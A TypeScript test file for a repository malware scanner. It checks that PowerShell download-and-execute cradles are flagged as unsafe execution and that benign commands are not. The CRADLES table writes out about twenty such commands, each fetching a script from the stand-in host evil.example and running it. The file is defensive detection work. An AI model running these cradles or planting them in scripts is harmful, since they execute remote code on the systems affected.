import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution and suspicious downloads. PowerShell cradles that download and
 * execute remote code directly in a shell or runtime must be flagged as
 * unsafe execution.
 */
const CRADLES: Record<string, string> = {
  "iex (irm ...)": 'iex (irm "https://evil.example/i.ps1")',
  "iex (Invoke-RestMethod ...)":
    'iex (Invoke-RestMethod "https://evil.example/i.ps1")',
  "Invoke-Expression (irm ...)":
    'Invoke-Expression (irm "https://evil.example/i.ps1")',
  "Invoke-Expression (Invoke-RestMethod ...)":
    'Invoke-Expression (Invoke-RestMethod "https://evil.example/i.ps1")',
  "Invoke-Expression (iwr ...)":
    'Invoke-Expression (iwr "https://evil.example/i.ps1")',
  "Invoke-Expression (Invoke-WebRequest ...)":
    'Invoke-Expression (Invoke-WebRequest "https://evil.example/i.ps1")',
  "irm | iex": 'irm "https://evil.example/i.ps1" | iex',
  "irm -useb | iex": 'irm -useb "https://evil.example/i.ps1" | iex',
  "Invoke-RestMethod | iex":
    'Invoke-RestMethod "https://evil.example/i.ps1" | iex',
  "iwr | iex": 'iwr -useb "https://evil.example/i.ps1" | iex',
  "Invoke-WebRequest | iex":
    'Invoke-WebRequest "https://evil.example/i.ps1" | iex',
  "irm | Invoke-Expression":
    'irm "https://evil.example/i.ps1" | Invoke-Expression',
  "Invoke-RestMethod | Invoke-Expression":
    'Invoke-RestMethod "https://evil.example/i.ps1" | Invoke-Expression',
  "pwsh -enc": "pwsh -enc AAAA\n",
  "pwsh -e": "pwsh -e AAAA\n",
  "pwsh -encodedcommand": "pwsh -encodedcommand AAAA\n",
  "irm | Out-String | iex":
    'irm "https://evil.example/i.ps1" | Out-String | iex',
  "iex ((New-Object Net.WebClient)...)":
    'iex ((New-Object Net.WebClient).DownloadString("https://evil.example/i.ps1"))',
  "(New-Object Net.WebClient)... | iex":
    '(New-Object Net.WebClient).DownloadString("https://evil.example/i.ps1") | iex',
  "iex (New-Object System.Net.WebClient)...":
    'iex (New-Object System.Net.WebClient).DownloadString("https://evil.example/i.ps1")',
};

test("powershell cradles downloading and executing code are unsafe execution", () => {
  for (const [name, body] of Object.entries(CRADLES)) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/bootstrap.ps1",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      name,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      name,
      findings: ["scripts/bootstrap.ps1:unsafe-execution:high"],
    });
  }
});

test("benign powershell commands keep no unsafe-execution finding", () => {
  for (const body of [
    'irm "https://example.com/api/v1/health"',
    'Invoke-RestMethod -Uri "https://example.com/api"',
    'iwr -Uri "https://example.com/file.zip" -OutFile file.zip',
    "powershell -ExecutionPolicy Bypass -File setup.ps1",
    "pwsh -File setup.ps1",
    "# Note: run irm or iex in documentation",
  ]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/setup.ps1",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ body, findings: [] });
  }
});

test("install scripts extracting downloads include irm and Invoke-RestMethod", () => {
  const inspection = inspectRepository({
    files: [
      {
        path: "install.ps1",
        bytes: new TextEncoder().encode(
          [
            'irm "https://downloads.example/agent.zip" -OutFile agent.zip',
            'Invoke-RestMethod "https://downloads.example/config.json" -OutFile config.json',
            "",
          ].join("\n"),
        ),
      },
    ],
  });
  expect(inspection.downloads).toEqual([
    "https://downloads.example/agent.zip",
    "https://downloads.example/config.json",
  ]);
});
